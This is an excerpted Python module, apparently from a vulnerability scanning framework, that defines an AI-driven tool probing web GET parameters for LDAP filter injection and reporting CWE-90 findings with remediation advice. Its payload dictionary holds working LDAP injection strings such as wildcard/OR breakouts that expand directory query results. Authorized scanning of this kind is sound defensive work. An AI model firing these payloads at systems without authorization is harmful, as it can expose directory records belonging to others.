"""Closed root-URL-only LDAP filter differential probe (#1296).

The model controls only a credential-free workflow root.  The probe discovers
same-origin GET filter links from that root and owns a fixed RFC4515 filter
matrix: broken structure, balanced repair, impossible/matching clauses,
wildcard/OR result-set expansion, stable repeat, and baseline replay.  It never
guesses an endpoint or accepts a model-provided payload.
"""
...
MODE = "ldap-filter-differential-v1"
RUNTIME_PROOF = "runtime-read-only"
LAB_PROOF = "lab-state-change"
USER_AGENT = "xASM-LDAP-Injection-Probe/1.0"
...
EVIDENCE_LABELS = (
    "ldap-root-baseline",
    "ldap-route-negative-control",
    "ldap-parameter-baseline",
    "ldap-syntax-break-control",
    "ldap-syntax-repair-control",
    "ldap-filter-false-control",
    "ldap-filter-true-control",
    "ldap-result-expansion-proof",
    "ldap-result-expansion-repeat",
    "ldap-baseline-replay",
)
...
def _response_has_ldap_error(status: int, body: str) -> bool:
    lower = str(body or "").lower()
    return status >= 500 or any(marker in lower for marker in LDAP_ERROR_MARKERS)
...
class WebLdapInjectionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:ldap_injection_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers a same-origin GET filter from a root URL and proves LDAP "
            "injection through fixed broken-filter, balanced repair, impossible/"
            "matching clause, wildcard-OR expansion, repeat, and replay controls."
        )
    ...
    def metadata(self) -> Dict[str, Any]:
        return {
            ...
            "primary_purpose": "Prove bounded LDAP filter result-set expansion",
        }
    ...
    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        ...
        try:
            ...
            negative_path = f"/.xasm-ldap-negative-{secrets.token_hex(12)}"
            ...
            for endpoint, parameter, baseline_value in candidates[: self._candidate_budget]:
                ...
                decisive = next(
                    ...
                    if step["label"] == "ldap-result-expansion-proof"
                )
            ...
            return self._result(
                target,
                proof_level,
                "no stable LDAP filter differential was proven",
                [root_step, negative_step],
            )
    ...
    async def _probe_candidate(
        ...
        payloads = {
            ...
            "repair": baseline_value + ")(objectClass=*",
            "false": baseline_value + ")(objectClass=xasmDefinitelyAbsent",
            "true_control": (
                baseline_value
                + ")(|(objectClass=*)(objectClass=xasmDefinitelyAbsent)"
            ),
            "expansion": "*)(|(objectClass=*)",
        }
        ...
        if (
            ...
            or not _response_has_ldap_error(
                syntax_break["status"], syntax_break["body"]
            )
            or _response_has_ldap_error(
    ...
    def _sanitize(self, value: str) -> str:
        ...
        for index, match in enumerate(
            ...
            sentinel = f"<xasm-ldap-marker-{index}>"
            protected.append((sentinel, match.group(0)))
            safe = safe.replace(match.group(0), sentinel, 1)
        for index, match in enumerate(
            list(re.finditer(r"/\.xasm-ldap-negative-[0-9a-f]{24}", safe))
        ):
            sentinel = f"<xasm-ldap-control-{index}>"
            protected.append((sentinel, match.group(0)))
            safe = safe.replace(match.group(0), sentinel, 1)
    ...
    def _verification(
        ...
        *,
        ...
        return {
            ...
            "ldapBalancedFilterProven": verified,
            ...
            "ldapEvidence": {"version": 1, "steps": steps},
    ...
    def _finding(
        ...
        return {
            "template-id": "xasm-ldap-filter-differential-verified",
            "matcher-name": "stable-ldap-filter-result-set-expansion",
            "matched-at": endpoint,
            ...
            "info": {
                "name": "LDAP Filter Injection Expands Directory-backed Query Results",
                "severity": "medium",
                "description": (
                    "A root-observed GET parameter entered an LDAP filter. A balanced repair "
                    "and matching clause reproduced the baseline, an impossible clause "
                    "returned no records, and a wildcard/OR breakout repeatedly exposed "
                    "additional stable directory-backed records."
                ),
                "remediation": (
                    "Do not concatenate request values into LDAP filters. Escape assertion "
                    "values according to RFC4515 or use a directory API that binds values, "
                    "then enforce visibility and authorization outside the filter."
                ),
                "classification": {"cwe-id": ["CWE-90"]},
            },
        }
...
def get_tool() -> WebLdapInjectionProbeTool:
    return WebLdapInjectionProbeTool()
